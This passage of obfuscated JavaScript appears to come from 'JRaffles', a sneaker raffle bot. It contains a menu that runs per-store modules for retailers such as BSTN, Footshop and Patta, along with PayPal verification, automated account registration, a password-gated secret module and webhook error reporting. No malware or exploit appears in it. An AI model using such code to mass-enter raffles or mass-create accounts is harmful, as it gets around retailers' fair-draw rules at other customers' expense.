                _0x3a603f('JRaffles\x20' + _0x5192c8), console['clear'](), console['log']('Hello\x20' + _0xe8dd24['cyan']('' + _0x4f2583) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5192c8), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x508c3d = 0x0; _0x508c3d < _0x6f29e['length'] - 0x4; _0x508c3d++) {
                    if (_0x508c3d >= 0xa) {
                        console['log']('\x20(' + _0x508c3d + ')\x20[' + _0x6f29e[_0x508c3d]['name'] + ']');
                        continue;
                    }
                    if (_0x6f29e[_0x508c3d]['name'] === 'Reload\x20Settings' || _0x6f29e[_0x508c3d]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x508c3d + ')\x20\x20[' + _0x6f29e[_0x508c3d]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x6f29e['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x6f29e['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x6f29e['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x6f29e['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x367a34();
                if (taskModule > _0x6f29e['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x41ff52(0x3e8), _0x195e2c();
                if (_0x6f29e[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x4e32bf = await _0x47bed4();
                            await _0x582726['function'](_0x582726, _0x4e32bf);
                        }
                        if (taskFunction == 0x2) {
                            var _0x4e32bf = await _0x47bed4(), _0x11ef48 = await _0x52e684(_0x582726);
                            _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x11ef48), await _0x582726['function'](_0x582726, _0x11ef48, _0x4e32bf);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4e32bf = await _0x47bed4(), _0x11ef48 = await _0x52e684(_0x582726);
                                _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x11ef48), await _0x582726['function'](_0x582726, _0x11ef48, _0x4e32bf);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x4e32bf = await _0x47bed4();
                                    await _0x582726['function'](_0x582726, _0x4e32bf);
                                }
                            }
                        }
                    } catch (_0x54d266) {
                        console['log'](_0x54d266), await _0x41ff52(0x7d0);
                    }
                    return _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                        var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4e32bf = await _0x47bed4(), _0x230a02 = await _0x52e684(_0x582726);
                            _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x230a02), await _0x582726['function'](_0x582726, _0x230a02, _0x4e32bf);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4e32bf = await _0x47bed4(), _0x230a02 = await _0x52e684(_0x582726);
                                _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x230a02), await _0x582726['function'](_0x582726, _0x230a02, _0x4e32bf);
                            }
                        }
                    } catch (_0x27f31e) {
                        console['log'](_0x27f31e), await _0x41ff52(0xfa0);
                    }
                    return _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                        var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4e32bf = await _0x47bed4(), _0x230a02 = await _0x52e684(_0x582726);
                            _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x230a02), await _0x582726['function'](_0x582726, _0x230a02, _0x4e32bf);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4e32bf = await _0x47bed4(), _0x230a02 = await _0x52e684(_0x582726);
                                _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x230a02), await _0x582726['function'](_0x582726, _0x230a02, _0x4e32bf);
                            }
                        }
                    } catch (_0x44b530) {
                        console['log'](_0x44b530), await _0x41ff52(0xfa0);
                    }
                    return _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x4e32bf = await _0x47bed4();
                        return await _0x582726['function'](_0x582726, _0x4e32bf), _0x195e2c();
                    }
                    var _0x4e32bf = await _0x47bed4(), _0x47560e = await _0x52e684(_0x582726);
                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x47560e), await _0x582726['function'](_0x582726, _0x47560e, _0x4e32bf), _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4e32bf = await _0x47bed4(), _0x47560e = await _0x52e684(_0x582726);
                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x47560e), await _0x582726['function'](_0x582726, _0x47560e, _0x4e32bf), _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4e32bf = await _0x47bed4(), _0x47560e = await _0x52e684(_0x582726);
                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x47560e), await _0x582726['function'](_0x582726, _0x47560e, _0x4e32bf), _0x195e2c();
                }
                if (_0x6f29e[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4e32bf = await _0x47bed4(), _0x47560e = await _0x52e684(_0x582726);
                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x47560e), await _0x582726['function'](_0x582726, _0x47560e, _0x4e32bf), _0x195e2c();
                } else {
                    if (_0x6f29e[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                        var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x4e32bf = await _0x47bed4(), _0x4383e2 = await _0x52e684(_0x582726);
                            return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x4383e2), await _0x582726['function'](_0x582726, _0x4383e2, _0x4e32bf), _0x195e2c();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4e32bf = await _0x47bed4();
                                return await _0x582726['function'](_0x582726, null, _0x4e32bf), _0x195e2c();
                            }
                        }
                        ;
                    } else {
                        if (_0x6f29e[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                            var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction], _0x4e32bf = await _0x47bed4(), _0x156594 = await _0x52e684(_0x582726);
                            return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x156594), await _0x582726['function'](_0x582726, _0x156594, _0x4e32bf), await _0x41ff52(0x1388), _0x195e2c();
                        } else {
                            if (_0x6f29e[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x4e32bf = await _0x47bed4(), _0x4383e2 = await _0x52e684(_0x582726);
                                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x4383e2), await _0x582726['function'](_0x582726, _0x4383e2, _0x4e32bf), _0x195e2c();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x4e32bf = await _0x47bed4();
                                        return await _0x582726['function'](_0x582726, null, _0x4e32bf), _0x195e2c();
                                    }
                                }
                                ;
                            } else {
                                if (_0x6f29e[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x582726);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x6f29e[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                        var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x4e32bf = await _0x47bed4(), _0xdb3c9f = await _0x52e684(_0x582726);
                                            return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0xdb3c9f), await _0x582726['function'](_0x582726, _0xdb3c9f, _0x4e32bf), _0x195e2c();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x4e32bf = await _0x47bed4(), _0xdb3c9f = await _0x52e684(_0x582726);
                                                return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0xdb3c9f), await _0x582726['function'](_0x582726, _0xdb3c9f, _0x4e32bf), _0x195e2c();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x6f29e[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                            var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4e32bf = await _0x47bed4(), _0x4133ed = await _0x52e684(_0x582726);
                                                return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x4133ed), await _0x582726['function'](_0x582726, _0x4133ed, _0x4e32bf), _0x195e2c();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4e32bf = await _0x47bed4(), _0x4133ed = await _0x52e684(_0x582726);
                                                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x4133ed), await _0x582726['function'](_0x582726, _0x4133ed, _0x4e32bf), _0x195e2c();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x6f29e[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                                var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4e32bf = await _0x47bed4(), _0x143a88 = await _0x52e684(_0x582726);
                                                    return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x143a88), await _0x582726['function'](_0x582726, _0x143a88, _0x4e32bf), _0x195e2c();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4e32bf = await _0x47bed4(), _0x143a88 = await _0x52e684(_0x582726);
                                                        return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x143a88), await _0x582726['function'](_0x582726, _0x143a88, _0x4e32bf), _0x195e2c();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x6f29e[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                                    var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4e32bf = await _0x47bed4(), _0x3ef89b = await _0x52e684(_0x582726);
                                                        return _0x4a0109['shuffleTasks'] && await _0x5c6b16(_0x3ef89b), await _0x582726['function'](_0x582726, _0x3ef89b, _0x4e32bf), _0x195e2c();
                                                    }
                                                } else {
                                                    if (_0x6f29e[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x41ff52(0x3e8), _0x195e2c();
                                                    else {
                                                        if (_0x6f29e[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x5c00b6 = _0x6f29e[taskModule]['name'], _0x4e32bf = await _0x47bed4();
                                                            return await _0x3c7a12(_0x5c00b6, _0x4e32bf), _0x195e2c();
                                                        } else {
                                                            if (_0x6f29e[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x347657(_0x6f29e[taskModule]['modules']);
                                                                var _0x582726 = _0x6f29e[taskModule]['modules'][taskFunction];
                                                                return await _0x582726['function'](_0x582726), _0x195e2c();
                                                            } else {
                                                                if (_0x6f29e[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x2aae08 = 0x0;
                                                                    for (const _0x4dbeb6 in _0x4a0109) {
                                                                        console['log']('(' + _0x2aae08 + ')\x20' + _0x4dbeb6 + '\x20:\x20' + _0x4a0109[_0x4dbeb6]), _0x2aae08++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x2aae08 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x585b3e = await _0x383911();
                                                                    if (_0x585b3e == _0x2aae08)
                                                                        return _0x195e2c();
                                                                    console['clear'];
                                                                    var _0x5ee660 = 0x0;
                                                                    for (var _0x592f45 in _0x4a0109) {
                                                                        if (_0x585b3e == _0x5ee660) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x592f45 + '\x20:'), _0x4a0109[_0x592f45] = await _0x4409c3(), _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109));
                                                                            break;
                                                                        } else
                                                                            _0x5ee660++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x41ff52(0xbb8), _0x195e2c();
                                                                } else {
                                                                    if (_0x6f29e[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0xa914ce(), _0x195e2c();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x6f29e[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x1f2c76 = await _0x12d1c1();
                                                                            _0x1f2c76 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x444f67(), await afewFunction(_0x3cbb71[_0x27ddc3], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x41ff52(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x195e2c();
            } catch (_0x4d9055) {
                return console['log'](_0x4d9055), _0x195e2c();
            }
        } catch (_0x1bf8a1) {
            return console['log'](_0x1bf8a1), await _0x41ff52(0x3a98);
        }
}
;
_0x3a603f('JRaffles\x20' + _0x5192c8), _0xa914ce();
try {
    _0x279bb5();
} catch (_0x4d14ed) {
    var _0x42ab9c = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x4f2583
            },
            {
                'name': 'Version',
                'value': '' + _0x5192c8
            },
            {
                'name': 'Error',
                'value': '' + _0x4d14ed
            }
        ]
    }];
    const _0xdbfffb = { 'embeds': _0x42ab9c };
    _0x161ab9(_0x11ee4c, _0xdbfffb);
}